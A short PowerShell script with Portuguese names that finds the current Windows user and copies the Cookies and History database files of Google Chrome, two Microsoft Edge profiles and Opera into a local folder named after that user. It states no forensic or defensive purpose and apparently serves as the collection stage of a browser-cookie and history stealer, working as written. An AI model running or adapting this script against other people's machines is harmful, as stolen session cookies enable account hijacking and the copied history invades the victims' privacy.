class Navegador
{
    [string]$nome
    [string]$caminho
    [string]$biscoito
    [string]$historico = "nada"
}

$a = whoami
$domain, $user = $a.split('\')

$gChrome = [Navegador]::new()
$gChrome.nome = "Google Chrome"
$gChrome.historico = "C:\Users\"+$user+"\AppData\Local\Google\Chrome\User Data\History"
$gChrome.biscoito = "C:\Users\"+$user+"\AppData\Local\Google\Chrome\User Data\Cookies"
$gChrome.caminho = "C:\Users\"+$user+"\AppData\Local\Google\Chrome\User Data"


$mEdge = [Navegador]::new()
$mEdge.nome = "Microsoft Edge"
$mEdge.historico = "C:\Users\"+$user+"\AppData\Local\Microsoft\Edge\User Data\Default\History"
$mEdge.biscoito = "C:\Users\"+$user+"\AppData\Local\Microsoft\Edge\User Data\Default\Cookies"
$mEdge.caminho = "C:\Users\"+$user+"\AppData\Local\Microsoft\Edge\User Data\Default"

$mEdge2 = [Navegador]::new()
$mEdge2.nome = "Microsoft Edge profile 2"
$mEdge2.historico = "C:\Users\"+$user+"\AppData\Local\Microsoft\Edge\User Data\Profile 1\History"
$mEdge2.biscoito = "C:\Users\"+$user+"\AppData\Local\Microsoft\Edge\User Data\Profile 1\Cookies"
$mEdge2.caminho = "C:\Users\"+$user+"\AppData\Local\Microsoft\Edge\User Data\Profile 1"

$opera = [Navegador]::new()
$opera.nome = "Opera Browser"
$opera.historico = "C:\Users\"+$user+"\AppData\Roaming\Opera Software\Opera Stable\History"
$opera.biscoito = "C:\Users\"+$user+"\AppData\Roaming\Opera Software\Opera Stable\Cookies"
$opera.caminho = "C:\Users\"+$user+"\AppData\Roaming\Opera Software\Opera Stable"

$arrNavegadores = $gChrome, $mEdge,$mEdge2, $opera

function ChecaCaminho {param ($firula)
    if(Test-Path $firula.caminho) {return $true}
    else { return $false}
}

$thisCaminho = ""
$thisCaminho += Get-Location #get this location
$thisCaminho += "\users\" #users folder to save the cookies

New-Item -Path $thisCaminho -Name $user -ItemType Directory

$caminhoComUser = $thisCaminho + $user

foreach ($item in $arrNavegadores) {
    if(ChecaCaminho($item))
    {#if the path of the browser exist it will copy the cookies to the users folder
        Write-Host $item.caminho" --- this path exist"
        New-Item -Path $caminhoComUser -Name $item.nome -ItemType Directory 
        $destino = ""
        $destino += $caminhoComUser + "\"+$item.nome
        Copy-Item -Path $item.biscoito -Destination $destino
        Copy-Item -Path $item.historico -Destination $destino
    }
    else 
    {
        Write-Host $item.caminho" --- this path dont exist"
    }
}
